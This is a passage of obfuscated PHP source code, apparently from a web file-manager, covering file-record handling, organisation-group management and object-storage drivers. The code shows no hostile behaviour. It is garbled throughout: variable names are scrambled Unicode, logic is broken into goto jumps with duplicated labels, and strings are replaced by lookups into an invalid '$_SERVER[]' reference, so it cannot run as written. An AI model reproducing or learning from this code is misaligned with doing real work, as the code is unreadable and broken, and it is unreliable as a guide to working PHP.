c܉: $c = $B . rand_string(5) . short_id(100); $Fق = str_replace($F[8], $F[71], KodIO::clear($Fق)); $b = $Eͻ->ext($Fق); goto DυҮ; DĔ: } public function addFileByRemote($e񋇸, $eۭ, $eق = array()) { goto b; E󢇕: $DፎÏ = IO::hashMd5($e񋇸, $f狿); $C = KodIO::defaultDriver(); $bģ = array($Eؗ釨[548] => IO::size($e񋇸), $Eؗ釨[1757] => 1, $Eؗ釨[413] => $eۭ, $Eؗ釨[779] => $C[$Eؗ釨[393]], $Eؗ釨[414] => $e񋇸, $Eؗ釨[1758] => $eق[$Eؗ釨[171]] ? $eق[$Eؗ釨[171]] : IO::hashSimple($e񋇸), $Eؗ釨[1759] => $DፎÏ ? $DፎÏ : $f狿); goto C; b: $Eؗ釨 =& $_SERVER[]; if (!IO::exist($e񋇸)) { return !1; } $f狿 = $eق[$Eؗ釨[170]] ? $eق[$Eؗ釨[170]] : $Eؗ釨[33]; goto E󢇕; C: if ($fѭ = $this->addFileCheckExist($bģ[$Eؗ釨[171]], $bģ[$Eؗ釨[170]], $bģ[$Eؗ釨[78]])) { return $fѭ; } return $this->addFileData($bģ); goto C獩; C獩: } private function addFileData($a֗) { $B饐 =& $_SERVER[]; if (!$a֗) { return !1; } $a֗[$B饐[78]] = intval($a֗[$B饐[78]]); if (!$a֗[$B饐[78]] && strlen($a֗[$B饐[171]]) > 32) { $a֗[$B饐[78]] = intval(substr($a֗[$B饐[171]], 32)); } $fɕ = $this->add($a֗); return $this->find($fɕ); } public function addFile($dџ, $F銣, $b = false) { goto b嘍; c: return $dܔ; goto B؛͆; Eּ㖏: $Cڕ = $this->addFileMake($dџ, $cؽ, $a٥긎, $C, $F銣, $b); $dܔ = $this->addFileData($Cڕ); CacheLock::unlock($Dа); goto c; c: $Dа = $_SERVER[][1760] . $C; CacheLock::lock($Dа); if ($d = $this->addFileCheckExist($a٥긎, $C, $cؽ)) { CacheLock::unlock($Dа); return $d; } goto Eּ㖏; b嘍: $a٥긎 = IO::hashSimple($dџ); $C = IO::hashMd5($dџ); $cؽ = IO::size($dџ); goto c; B؛͆: } public function addFileMake($eªޙ, $E޻, $D, $e, $f, $d챗) { goto D̘Ç; D̘Ç: $a =& $_SERVER[]; $AĐ = $this->createFileName($f, $D, $e); $E = get_path_father($AĐ); goto C؝; C؝: $a´۲ = get_path_this($AĐ); if ($d챗) { $f = IO::move($eªޙ, $E, !1, $a´۲); } else { $f = IO::copy($eªޙ, $E, !1, $a´۲); } if (!$f) { return !1; } goto Cަۉ; Cަۉ: $A넆 = KodIO::defaultDriver(); $C赩 = array($a[548] => $E޻, $a[1757] => 1, $a[413] => $f, $a[779] => $A넆[$a[393]], $a[414] => $AĐ, $a[1758] => $D, $a[1759] => $e); return $C赩; goto b; b: } public function addFileCheckExist($F̓, $d̅, $A) { $fʘ =& $_SERVER[]; $eگ = $this->findByHash($F̓, $d̅); if (!$eگ) { return !1; } $a埵 = array($fʘ[1757] => intval($eگ[$fʘ[1761]]) + 1, $fʘ[548] => $A); $this->where(array($fʘ[448] => $eگ[$fʘ[447]]))->save($a埵); return $eگ; } public function remove($Fƾ) { $this->linkCountChange($Fƾ, !1); $this->clearEmpty(); return !0; } public function linkAdd($e) { $this->linkCountChange($e, !0); } public function linkCountChange($A͉, $a) { goto e; c: foreach ($D as $dƚ => $Cˇ) { $Bʺߣ = $Cˇ . $fަ[33]; if (!$c댏[$Bʺߣ]) { $c댏[$Bʺߣ] = array(); } $c댏[$Bʺߣ][] = $dƚ; } foreach ($c댏 as $Cˇ => $D㝤) { if (!$D㝤) { continue; } $Cˇ = $a ? $Cˇ : -intval($Cˇ); $Bٍ݅ = array($fަ[447] => array($fަ[7], $D㝤)); if ($Cˇ < 0) { $Bٍ݅[$fަ[1761]] = array($fަ[979], abs($Cˇ)); } $this->where($Bٍ݅)->setAdd($fަ[1761], $Cˇ); } goto A嫐; e: $fަ =& $_SERVER[]; if (!$A͉) { return; } if (!is_array($A͉)) { $A͉ = array($A͉); } goto f츆; f츆: $D = array(); foreach ($A͉ as $dƚ) { $Bʺߣ = $dƚ . $fަ[33]; if (!$D[$Bʺߣ]) { $D[$Bʺߣ] = 0; } $D[$Bʺߣ]++; } $c댏 = array(); goto c; A嫐: } public function findByHash($Aж, $D = false) { $aĮ =& $_SERVER[]; if (!$Aж && !$D) { return !1; } $D = array($aĮ[1758] => $Aж); if ($D) { $D = array($aĮ[1759] => $D); } return $this->order($aĮ[1762])->where($D)->find(); } public function clearEmpty($f甮ռ = 0) { goto c̣; ã: $D翐 = $this->where($Aʹ)->select(); if (!$D翐) { return; } $a¹̺ = new Task($eϞ[1764], $eϞ[33], count($D翐)); goto Fٖ; c̣: $eϞ =& $_SERVER[]; $f = time() - 3600 * 24 * $f甮ռ; $Aʹ = $eϞ[1763] . $f; goto ã; Fٖ: foreach ($D翐 as $c󯔯) { $a¹̺->update(1); $this->resetFile($c󯔯); } $a¹̺->end(); goto Eܭ┶; Eܭ┶: } public function resetFile($bɗ) { goto Dڦ鮋; Dڦ鮋: $Aʦ =& $_SERVER[]; $Bː = array($Aʦ[448] => $bɗ[$Aʦ[447]]); $c؉ = Model($Aʦ[1213])->where($Bː)->count(); goto F; F: $aώ = Model($Aʦ[1765])->where($Bː)->count(); $CΎ = intval($c؉) + intval($aώ); if ($CΎ == 0) { IO::remove($bɗ[$Aʦ[76]]); Model($Aʦ[1766])->delete($bɗ[$Aʦ[447]]); $this->where($Bː)->delete(); $this->metaSet($bɗ[$Aʦ[447]], null, null); return; } goto FѭŽ; FѭŽ: if ($bɗ[$Aʦ[1761]] != $CΎ) { $this->where($Bː)->save(array($Aʦ[1757] => $CΎ)); } goto f; f: } public function storageInfo($Fλӗ = false) { goto bʐ; eÃ輕: $Fƥ = 1; $F귈 = 0; $f = 5000; goto D飿; D飿: for ($AÔ = 0; $AÔ < $F撄ʯ; $AÔ = $AÔ + $f) { $eͺ = $this->limit($AÔ, $AÔ + $f)->select(); foreach ($eͺ as $Fͳ) { $Fƥ += $Fͳ[$b֚[78]] * $Fͳ[$b֚[1761]]; $D += $Fͳ[$b֚[78]] * ($Fͳ[$b֚[1761]] - 1); $F귈 += $Fͳ[$b֚[1761]]; } } $b = array($b֚[1767] => $Fƥ, $b֚[1768] => $D, $b֚[1769] => $D / $Fƥ, $b֚[82] => $F撄ʯ, $b֚[1770] => $F귈); return $b; goto C; bʐ: $b֚ =& $_SERVER[]; $F撄ʯ = $this->count() + 0.0; $D = 0; goto eÃ輕; C: } } class GroupModel extends ModelBase { protected $tableName = "\x67\x72\x6f\165\x70"; protected $tableMeta = array("\x74\141\142\x6c\145\x4e\141\x6d\x65" => "\147\162\x6f\x75\x70\x5f\155\x65\x74\141", "\x6d\145\x74\x61\x46\x69\145\x6c\144" => "\x67\162\157\165\x70\111\x44"); protected function cacheFunctionAlias($eԼ֖) { $Fڹ =& $_SERVER[]; return array($Fڹ[1771] => array($eԼ֖[0], $Fڹ[1772]), $Fڹ[1773] => array($eԼ֖[0], $Fڹ[1772])); } protected function getInfo($cֶ) { $b = $this->getInfoSimple($cֶ); if (!$b) { return !1; } return $this->_listDataApplyItem($b); } protected function getInfoSimple($Bޠ҆, $d = false) { $Bȱ =& $_SERVER[]; if ($d) { $aܕ = array($Bȱ[1701] => intval($Bޠ҆)); $e醎 = $this->where($aܕ)->find(); return is_array($e醎) ? $e醎 : array(); } return $this->cacheFunctionGet($Bȱ[1774], $Bޠ҆); } protected function groupAdd($dڧ) { goto FĹ; FĹ: $b =& $_SERVER[]; if (!$dڧ[$b[478]] && isset($dڧ[$b[1701]]) && $dڧ[$b[1701]] == 1) { if ($Bټ = $this->getInfoSimple($dڧ[$b[1701]], !0)) { return $dڧ[$b[1701]]; } } else { $Bټ = $this->getInfoSimple($dڧ[$b[478]]); if (!$Bټ) { return !1; } } $dݢҽ = $b[498]; goto B; Bȏ: if (!empty($dڧ[$b[1701]])) { $Bʿ˫[$b[1701]] = $dڧ[$b[1701]]; } $d߈ڑ = $this->add($Bʿ˫); $this->setNamePinyin($d߈ڑ, $Bʿ˫[$b[28]]); goto B; B: if ($Bټ[$b[487]]) { $dݢҽ = $Bټ[$b[487]] . $Bټ[$b[1701]] . $b[47]; } $Bʿ˫ = array($b[413] => $this->groupNameAuto($dڧ[$b[478]], $dڧ[$b[28]]), $b[394] => $dڧ[$b[478]], $b[553] => $dݢҽ, $b[1775] => $dڧ[$b[1685]], $b[1776] => 0, $b[1705] => 0); if (isset($dڧ[$b[1724]])) { $Bʿ˫[$b[1724]] = $dڧ[$b[1724]]; } else { $bȖ = $this->max($b[1724]); if (!$bȖ) { $bȖ = 0; } $Bʿ˫[$b[1724]] = $bȖ + 1; } goto Bȏ; B: if (isset($dڧ[$b[1777]])) { $this->metaSet($d߈ڑ, array($b[1777] => $dڧ[$b[1777]], $b[1778] => $dڧ[$b[1778]])); unset($dڧ[$b[1777]]); unset($dڧ[$b[1778]]); } Model($b[1213])->groupRootAdd($d߈ڑ); return $d߈ڑ; goto E; E: } protected function groupEdit($d, $aߖ) { goto a濒; a濒: $f۫Ӥ =& $_SERVER[]; $bϋ˄ = $this->getInfoSimple($d); if (!$bϋ˄) { return !1; } goto fڜٳ; aً蒿ƻ: if (isset($aߖ[$f۫Ӥ[28]]) && $aߖ[$f۫Ӥ[28]] != $bϋ˄[$f۫Ӥ[28]]) { $this->_clearChildrenCache($bϋ˄); } return $this->where(array($f۫Ӥ[1779] => $d))->save($aߖ); goto a뉣; fڜٳ: if (!empty($aߖ[$f۫Ӥ[478]])) { $dљ = $this->getInfoSimple($aߖ[$f۫Ӥ[478]]); if (!$dљ) { return !1; } if ($bϋ˄[$f۫Ӥ[1701]] == $dљ[$f۫Ӥ[1701]]) { return !1; } if ($aߖ[$f۫Ӥ[478]] != $bϋ˄[$f۫Ӥ[478]]) { if ($dљ[$f۫Ӥ[487]] !== $bϋ˄[$f۫Ӥ[487]] && strpos($dљ[$f۫Ӥ[487]], $bϋ˄[$f۫Ӥ[487]] . $bϋ˄[$f۫Ӥ[1701]] . $f۫Ӥ[47]) === 0) { return !1; } $aߖ[$f۫Ӥ[553]] = $dљ[$f۫Ӥ[487]] . $aߖ[$f۫Ӥ[478]] . $f۫Ӥ[47]; $this->_changeChildLevel($bϋ˄, $dљ); } } if (isset($aߖ[$f۫Ӥ[28]])) { $this->setNamePinyin($d, $aߖ[$f۫Ӥ[28]]); } if (isset($aߖ[$f۫Ӥ[1777]])) { $this->metaSet($d, array($f۫Ӥ[1777] => $aߖ[$f۫Ӥ[1777]], $f۫Ӥ[1778] => $aߖ[$f۫Ӥ[1778]])); unset($aߖ[$f۫Ӥ[1777]]); unset($aߖ[$f۫Ӥ[1778]]); } goto aً蒿ƻ; a뉣: } private function _clearChildrenCache($FВ) { $Cؑ =& $_SERVER[]; $e = array($Cؑ[553] => array($Cؑ[512], $FВ[$Cؑ[487]] . $FВ[$Cؑ[1701]] . $Cؑ[513])); $Cԏ = $this->field($Cؑ[1701])->where($e)->select(); foreach ($Cԏ as $dˠ) { $this->cacheFunctionClear($Cؑ[1780], $dˠ[$Cؑ[1701]]); $this->cacheFunctionClear($Cؑ[1774], $dˠ[$Cؑ[1701]]); } } private function _changeChildLevel($D͝ƾ, $a, $A = false) { goto dᯥ; eԋ: $this->_clearChildrenCache($D͝ƾ); $this->where($a)->data($Dυ)->save(); goto EÃҭ; Dҳ: if ($A) { $fǅш = $a[$Cψ[487]] . $a[$Cψ[1701]] . $Cψ[47]; } $a = array($Cψ[553] => array($Cψ[512], $D͝ƾ[$Cψ[487]] . $D͝ƾ[$Cψ[1701]] . $Cψ[513])); $Dυ = array($Cψ[553] => array($Cψ[561], "\x72\x65\x70\x6c\x61\143\145\x28\160\141\162\x65\156\x74\x4c\145\x76\145\154\54\x27{$eձ}\x27\x2c\47{$fǅш}\x27\x29")); goto eԋ; dᯥ: $Cψ =& $_SERVER[]; $eձ = $D͝ƾ[$Cψ[487]] . $D͝ƾ[$Cψ[1701]] . $Cψ[47]; $fǅш = $a[$Cψ[487]] . $a[$Cψ[1701]] . $Cψ[47] . $D͝ƾ[$Cψ[1701]] . $Cψ[47]; goto Dҳ; EÃҭ: } public function setNamePinyin($eâ, $Aʑ = false) { $c =& $_SERVER[]; if (!$Aʑ) { $f·ю = $this->getInfoSimple($eâ); $Aʑ = $f·ю[$c[28]]; } if (!Input::check($Aʑ, $c[556])) { $this->metaSet($eâ, $c[444], null); $this->metaSet($eâ, $c[443], null); return; } $f״ = array($c[444] => str_replace($c[50], $c[33], Pinyin::encode($Aʑ)), $c[443] => Pinyin::encode($Aʑ, $c[557])); $this->metaSet($eâ, $f״); } protected function groupStatus($c֞ԍ, $d݊) { goto b; b: $d٩ =& $_SERVER[]; $eշǣ = $this->getInfoSimple($c֞ԍ); if (!$eշǣ) { return !1; } goto d˾; d˾: if ($d݊ == $d٩[87]) { $Cә = $this->parentLevelArray($eշǣ[$d٩[487]]); } else { $Cײ = array($d٩[553] => array($d٩[512], $eշǣ[$d٩[487]] . $eշǣ[$d٩[1701]] . $d٩[513])); $Cә = $this->where($Cײ)->field($d٩[1701])->select(); $Cә = array_to_keyvalue($Cә, $d٩[33], $d٩[1701]); } $Cә[] = $eշǣ[$d٩[1701]]; $D鋏 = array(); goto f欮; f欮: foreach ($Cә as $c֞ԍ) { $D鋏[] = array($d٩[1701] => $c֞ԍ, $d٩[93] => $d٩[716], $d٩[372] => $d݊); } return Model($d٩[1781])->addAll($D鋏, array(), !0); goto EՂ; EՂ: } protected function groupRemove($a˧ӷ) { goto c; e⥋: $this->where(array($BЫ[478] => $a˧ӷ))->save(array($BЫ[478] => $EИǬ[$BЫ[478]])); Model($BЫ[1781])->where($F⸹ƃ)->delete(); Model($BЫ[1782])->where($F⸹ƃ)->delete(); goto Eн; c: $BЫ =& $_SERVER[]; $F⸹ƃ = array($BЫ[1701] => $a˧ӷ); $EИǬ = $this->where($F⸹ƃ)->find(); goto Dλԭ; Dλԭ: if (!$EИǬ || $EИǬ[$BЫ[478]] == 0) { return !1; } $A = $this->getInfoSimple($EИǬ[$BЫ[478]]); $this->_changeChildLevel($EИǬ, $A, !0); goto e⥋; Eн: Model($BЫ[796])->groupRootRemove($a˧ӷ); return $this->where($F⸹ƃ)->delete(); goto f½; f½: } protected function groupSort($E򬇨) { $Bƙ =& $_SERVER[]; $bǈ = array(); foreach ($E򬇨 as $cӈ => $C) { $bǈ[] = array($Bƙ[1701], $C, $Bƙ[1724], $cӈ + 1); } $this->saveAll($bǈ); } public function listData() { $AˡϹ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($AˡϹ[$_SERVER[][367]]); return $AˡϹ; } private function _makeOrder($Cχ = '') { goto D; CԲ: $aʑ = Input::get($A[435], $A[7], $A[1705], $e); $A = Input::get($A[436], $A[7], $A[1783], array($A[1783], $A[430])); $A = $Eʗ[$A]; goto D佄; D: $A =& $_SERVER[]; $e = array($A[1701], $A[28], $A[1687], $A[194]); $Eʗ = array($A[428] => $A[429], $A[430] => $A[431]); goto CԲ; D佄: $Cχ = $Cχ . "{$aʑ}\x20{$A}\54\x20\147\162\157\x75\160\x49\104\x20\141\x73\143"; return $this->order($Cχ); goto f㥠; f㥠: } public function listChild($Eظ) { $B =& $_SERVER[]; $Eח = $this->where(array($B[478] => $Eظ))->_makeOrder()->selectPage(200); $this->_listDataApply($Eח[$B[367]]); return $Eח; } public function listByID($dڡ) { $e鐃 =& $_SERVER[]; if (!$dڡ) { return array(); } $c = array($e鐃[1701] => array($e鐃[7], $dڡ)); $C싃 = $this->where($c)->select(); $this->_listDataApply($C싃); return $C싃; } public function listSearch($B기) { goto B碑չ; bω: $A㑰 = $A㑰 ? $A㑰 : array($CŠ´[367] => array(), $CŠ´[364] => array()); if (!$A㑰 || count($A㑰[$CŠ´[367]]) < 5 && Input::check($a, $CŠ´[316])) { goto Aǿѝ; D: $A㑰[$CŠ´[364]][$CŠ´[366]] = ceil($A㑰[$CŠ´[364]][$CŠ´[365]] / $A㑰[$CŠ´[364]][$CŠ´[361]]); goto Cʣ; Aǿѝ: $C = $this->groupChildrenAll($bڒ); $E = $this->_searchFromMeta($CŠ´[443], $a, 10, $C); $aب = $this->_searchFromMeta($CŠ´[444], $a, 10, $C); goto eʽ; eʽ: $cؐ = array_merge($E, $aب, $A㑰[$CŠ´[367]]); $A㑰[$CŠ´[367]] = array_unique_by_key($cؐ, $CŠ´[1701]); $A㑰[$CŠ´[364]][$CŠ´[365]] = count($A㑰[$CŠ´[367]]); goto D; Cʣ: } $this->_listDataApply($A㑰[$CŠ´[367]]); goto B; E򬱏ن: if (!trim($a)) { return !1; } $a = str_replace($CŠ´[1786], $CŠ´[1787], $a); $bڛ = array($CŠ´[1701] => array($CŠ´[380], "{$a}\x25"), $CŠ´[28] => array($CŠ´[380], "\45{$a}\x25"), $CŠ´[964] => $CŠ´[1788]); goto C; B: return $A㑰; goto aՏ; C: if ($bڒ) { $DĦ = $this->getInfoSimple($bڒ); $BޤӃӽ = $DĦ[$CŠ´[487]] . $bڒ . $CŠ´[513]; $bڛ = array($bڛ, array($CŠ´[487] => array($CŠ´[380], $BޤӃӽ))); } $bڛ = $this->parseWhereLike($bڛ); $A㑰 = $this->_makeOrder()->where($bڛ)->selectPage(20); goto bω; B碑չ: $CŠ´ =& $_SERVER[]; $a = $B기[$CŠ´[1784]]; $bڒ = isset($B기[$CŠ´[1785]]) ? $B기[$CŠ´[1785]] : !1; goto E򬱏ن; aՏ: } protected function groupChildrenAll($b) { $b =& $_SERVER[]; if (!$b) { return !1; } if (is_string($b)) { $b = array($b); } $D۞ = $b; foreach ($b as $aŭǒ) { $a = $this->getInfoSimple($aŭǒ); $e۫Ă = array($b[487] => array($b[380], $a[$b[487]] . $aŭǒ . $b[513])); $bȶι = $this->field($b[1701])->where($e۫Ă)->select(); $D۞ = array_merge($D۞, array_to_keyvalue($bȶι, $b[33], $b[1701])); } return array_unique($D۞); } private function _searchFromMeta($aص, $c˞, $B, $C) { goto D܆; bїת: if (!$Fߠ) { return array(); } return $Fߠ; goto CҦ; D܆: $Fڶğ =& $_SERVER[]; $c˞ = strtolower($c˞); $Aы = array($Fڶğ[93] => $aص, $Fڶğ[372] => array($Fڶğ[380], "\45{$c˞}\x25")); goto f; E: if (!$b) { return array(); } $b = array_to_keyvalue($b, $Fڶğ[33], $Fڶğ[1701]); $Fߠ = $this->where(array($Fڶğ[1779] => array($Fڶğ[7], $b)))->select(); goto bїת; f: $Aы = $this->parseWhereLike($Aы); if ($C) { $Aы[$Fڶğ[1701]] = array($Fڶğ[7], $C); } $b = Model($Fڶğ[1789])->where($Aы)->limit($B)->select(); goto E; CҦ: } protected function _listDataApplyItem($e􆉿) { $b߂ = array($e􆉿); $this->_listDataApply($b߂); return $b߂[0]; } protected function _listDataApply(&$F) { goto C; d: $this->_listAppendParent($F); $this->_listAppendSourceRoot($F, $D); goto b; Cǈ: $this->_listAppendChildren($F); $this->_listAppendChildrenMember($F); $this->_listAppendMeta($F, $D); goto d; C: $AÐ =& $_SERVER[]; if (!$F) { return; } $D = array_to_keyvalue($F, $AÐ[33], $AÐ[1701]); goto Cǈ; b: } private function _listAppendChildren(&$b) { goto Dﴴ; Aҡ: foreach ($b as &$d) { $b = $d[$eކ[1701]]; $d[$eކ[1791]] = isset($AՇ[$b]) ? intval($AՇ[$b]) : !1; } unset($d); goto F뭯; Dﴴ: $eކ =& $_SERVER[]; $BՅ = array_to_keyvalue($b, $eކ[33], $eކ[1701]); $aμ = array($eކ[478] => array($eކ[7], $BՅ)); goto dȸ; dȸ: $A۪ܯ = array($eކ[478], $eކ[1790] => $eކ[480]); $d̸ = $this->field($A۪ܯ)->where($aμ)->group($eކ[478])->select(); $AՇ = array_to_keyvalue($d̸, $eކ[478], $eކ[480]); goto Aҡ; F뭯: } private function _listAppendChildrenMember(&$Cһ) { goto B; B: $f =& $_SERVER[]; $aƇ = array_to_keyvalue($Cһ, $f[33], $f[1701]); $c = array($f[1701] => array($f[7], $aƇ)); goto F; F: $D͕缞 = array($f[1701], $f[1790] => $f[480]); $A׉ = Model($f[1782])->field($D͕缞)->where($c)->group($f[1701])->select(); $c = array_to_keyvalue($A׉, $f[1701], $f[480]); goto B̮Ҫ; B̮Ҫ: foreach ($Cһ as &$Dѯڔ) { $aƕ = $Dѯڔ[$f[1701]]; $Dѯڔ[$f[1792]] = isset($c[$aƕ]) ? intval($c[$aƕ]) : !1; } unset($Dѯڔ); goto C; C: } private function _listAppendMeta(&$d򝈽, $aē) { goto Cҕ; b: $b = array_to_keyvalue_group($b, $fȇ[1701]); foreach ($b as &$c) { $c = array_to_keyvalue($c, $fȇ[93], $fȇ[372]); } unset($c); goto a; Cҕ: $fȇ =& $_SERVER[]; $Dۚ = array($fȇ[1701] => array($fȇ[7], $aē)); $b = Model($fȇ[1781])->where($Dۚ)->select(); goto b; a: foreach ($d򝈽 as &$e܇) { $e܇[$fȇ[445]] = array(); if (isset($b[$e܇[$fȇ[1701]]])) { $e܇[$fȇ[445]] = $b[$e܇[$fȇ[1701]]]; } } unset($e܇); goto Dԏʑ; Dԏʑ: } protected function parentLevelArray($dö) { $Bܷ =& $_SERVER[]; $dö = explode($Bܷ[47], trim($dö, $Bܷ[47])); $dö = array_remove_value($dö, $Bܷ[191]); return $dö; } private function _listAppendParent(&$Aʠ) { goto CĆ; d: if ($GLOBALS[$eЧ[485]] == $eЧ[87]) { $A = !1; } foreach ($Aʠ as &$aܩ) { $a = $this->parentLevelArray($aܩ[$eЧ[487]]); $Bǖ = $eЧ[33]; foreach ($a as $Cㆠ => $AƦ) { if ($A && $Cㆠ == 0) { continue; } $Bǖ .= $Aѧי[$AƦ] . $eЧ[8]; } if ($a) { $Bǖ .= $aܩ[$eЧ[28]]; } $aܩ[$eЧ[491]] = str_replace($eЧ[496], $eЧ[8], $Bǖ); } unset($aܩ); goto dԍ̬; D׊Ѽᐊ: unset($aܩ); foreach ($Aѧי as $Cㆠ => $eЈ) { if ($eЈ) { continue; } $Eٟӽ = $this->getInfoSimple($Cㆠ); $Aѧי[$Cㆠ] = $Eٟӽ[$eЧ[28]]; } $A = $GLOBALS[$eЧ[6]][$eЧ[88]][$eЧ[1793]]; goto d; CĆ: $eЧ =& $_SERVER[]; $Aѧי = array(); foreach ($Aʠ as &$aܩ) { $Aѧי[$aܩ[$eЧ[1701]]] = $aܩ[$eЧ[28]]; $a = $this->parentLevelArray($aܩ[$eЧ[487]]); foreach ($a as $AƦ) { if (!isset($Aѧי[$AƦ])) { $Aѧי[$AƦ] = 0; } } } goto D׊Ѽᐊ; dԍ̬: } private function _listAppendSourceRoot(&$dܧ텻, $E) { goto Aճ; D؋ї: foreach ($dܧ텻 as &$C斏) { $C斏[$bé[85]] = $Aڣ[$C斏[$bé[1701]]] ? $Aڣ[$C斏[$bé[1701]]] : array(); } unset($C斏); goto EЂڨ; B岺: $Aڣ = Model($bé[796])->order($bé[1795])->field($aԵ)->where($fߦ)->select(); $Aڣ = array_to_keyvalue($Aڣ, $bé[484]); $Aڣ = array_remove_key($Aڣ, $bé[484]); goto D؋ї; Aճ: $bé =& $_SERVER[]; $fߦ = array($bé[404] => SourceModel::TYPE_GROUP, $bé[478] => 0, $bé[484] => array($bé[7], $E)); $aԵ = $bé[1794]; goto B岺; EЂڨ: } protected function groupMerge($D͸) { $D͸ = array_values(array_unique($D͸)); $f = array(); for ($bć = 0; $bć < count($D͸); $bć++) { $fυ = !1; for ($D澅ܯ = 0; $D澅ܯ < count($D͸); $D澅ܯ++) { if ($bć == $D澅ܯ) { continue; } if ($this->isParentOf($D͸[$D澅ܯ], $D͸[$bć])) { $fυ = !0; break; } } if (!$fυ) { $f[] = $D͸[$bć]; } } return $f; } protected function isParentOf($Aؓ, $Aݑ) { goto b; fڨ޸: return !1; goto eŊ; A섂: $Cȅ = $this->getInfoSimple($Aݑ); $fᏎ = $fŝ[$f[487]] . $Aؓ . $f[47]; if (substr($Cȅ[$f[487]], 0, strlen($fᏎ)) == $fᏎ) { return !0; } goto fڨ޸; b: $f =& $_SERVER[]; if (!$Aؓ || !$Aݑ || $Aؓ == $Aݑ) { return !1; } $fŝ = $this->getInfoSimple($Aؓ); goto A섂; eŊ: } public function groupShowRoot($cȝ, $fٛ뤟 = false) { goto Ḃŏ; E: return $Fǅ݄; goto eŘ; C: $f = $this->parentLevelArray($F֙[$B¬[487]]); $Fǅ݄ = array($cȝ); if (count($f) == 0) { return $Fǅ݄; } goto Bԗ; Bԗ: if ($fٛ뤟 && count($f) == 1) { return $Fǅ݄; } if (!$F֙[$B¬[445]] || !isset($F֙[$B¬[445]][$B¬[1777]]) || $F֙[$B¬[445]][$B¬[1777]] == $B¬[1751]) { return $this->groupShowRoot($f[count($f) - 1], $fٛ뤟); } if ($F֙[$B¬[445]][$B¬[1777]] == $B¬[357]) { $d = explode($B¬[47], $F֙[$B¬[445]][$B¬[1778]]); if ($d) { $Fǅ݄ = array_merge($Fǅ݄, $d); } } goto E; Ḃŏ: $B¬ =& $_SERVER[]; $F֙ = $this->getInfo($cȝ); if (!$F֙) { return array(); } goto C; eŘ: } protected function resetParentLevel() { $eˇ =& $_SERVER[]; $C = $eˇ[1701]; $b麫 = $this->select(); $b麫 = array_to_keyvalue($b麫, $C); foreach ($b麫 as $Cߟ) { goto Cɘ; Cɘ: $Eɋ = $Cߟ; $Eڟ = array(); while ($Eɋ[$eˇ[478]] != 0) { $Eڟ[] = $Eɋ[$eˇ[478]]; $Eɋ = $b麫[$Eɋ[$eˇ[478]]]; } goto eŕխ; b: $this->where(array($C => $Cߟ[$C]))->save(array($eˇ[553] => $Eڟ)); goto cꎏ؎; eŕխ: $Eڟ[] = 0; $Eڟ = $eˇ[47] . implode($eˇ[47], array_reverse($Eڟ)) . $eˇ[47]; $this->setNamePinyin($Cߟ[$C], $Cߟ[$eˇ[28]]); goto b; cꎏ؎: } return $b麫; } public function groupNameAuto($fքѐ, $B돊) { $Fߑ =& $_SERVER[]; $bȉ = $this->where(array($Fߑ[394] => $fքѐ))->getField($Fߑ[28], !0); if (!$bȉ || !in_array($B돊, $bȉ)) { return $B돊; } for ($eፊ = 1; $eፊ <= count($bȉ) + 1; $eፊ++) { $E = $B돊 . "\50{$eፊ}\51"; if (!in_array($E, $bȉ)) { return $E; } } } public function groupSwitch($b˄, $b匾) { goto D; Eƅ: $e圉驲 = array_to_keyvalue($e圉驲, $Aת[1701]); if (!isset($e圉驲[$b˄]) || !isset($e圉驲[$b匾]) || $e圉驲[$b˄][$Aת[478]] == 0) { return !1; } $B = array($Aת[1701] => $b˄); goto cܻձ; B޴: $b = !empty($a[$b˄]) ? $a[$b˄] : !1; if ($b) { goto E; A豏: $a = Model($Aת[796])->where($B)->field($Aת[1798])->select(); if (!$a) { $a = array(); } Model($Aת[796])->moveClearAuth = !1; goto fۊ; A̅˔: $C = array($Aת[484] => $b匾); Model($Aת[1799])->where($B)->save($C); Model($Aת[1800])->where($B)->save($C); goto d㻜Ɠ; E: if (!$a[$b匾]) { $a[$b匾] = Model($Aת[796])->groupRootAdd($b匾); } $fě = $a[$b匾]; $B = array($Aת[478] => $b); goto A豏; fۊ: foreach ($a as $D) { $D͠ = $D[$Aת[403]] == $Aת[87] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($Aת[796])->move($D[$Aת[395]], $fě, $D͠); } Model($Aת[796])->moveClearAuth = !0; $B = array($Aת[404] => 2, $Aת[484] => $b˄); goto A̅˔; d㻜Ɠ: } $this->_changeChildLevel($e圉驲[$b˄], $e圉驲[$b匾], !0); goto c޻; cܻձ: $A胏 = Model($Aת[1782])->where($B)->select(); if (!$A胏) { $A胏 = array(); } foreach ($A胏 as $a) { $aԏ = $a[$Aת[1533]]; $B = array($Aת[1533] => $aԏ, $Aת[1701] => $b匾); $fᅃ = Model($Aת[1782])->where($B)->find(); if (!$fᅃ) { $a߲ = array($b匾 => $a[$Aת[1796]]); Model($Aת[506])->userGroupAdd($aԏ, $a߲); } Model($Aת[506])->userGroupRemove($aԏ, $b˄); } goto Fе; c޻: $this->where(array($Aת[478] => $b˄))->save(array($Aת[478] => $b匾)); return !0; goto fͼ⇉; Fе: $B = array($Aת[404] => 2, $Aת[478] => 0, $Aת[403] => 1, $Aת[484] => array($Aת[7], array($b˄, $b匾))); $a = Model($Aת[796])->where($B)->field($Aת[1797])->select(); $a = array_to_keyvalue($a, $Aת[484], $Aת[395]); goto B޴; D: $Aת =& $_SERVER[]; $B = array($Aת[1701] => array($Aת[7], array($b˄, $b匾))); $e圉驲 = $this->where($B)->select(); goto Eƅ; fͼ⇉: } } goto cÌߘ; b»: class PathDriverOOS extends PathDriverBaseS3 { public function __construct($e׊) { parent::__construct($e׊); $this->signatureVersion($_SERVER[][212]); } public function fileOutLink($cǻߢ) { $F̄Ǆֹ =& $_SERVER[]; if (substr($cǻߢ, 0, 7) == $F̄Ǆֹ[1211]) { $cǻߢ = $F̄Ǆֹ[1212] . substr($cǻߢ, 7); } header($F̄Ǆֹ[159] . $cǻߢ); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public function __construct($A߂) { parent::__construct(); include_once SDK_DIR . $_SERVER[][1267]; $this->_init($A߂); } public function _init($e) { $DƑΦ =& $_SERVER[]; foreach ($e as $a͔ => $D) { if (isset($this->{$a͔})) { $this->{$a͔} = $D; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($DƑΦ[1268] . 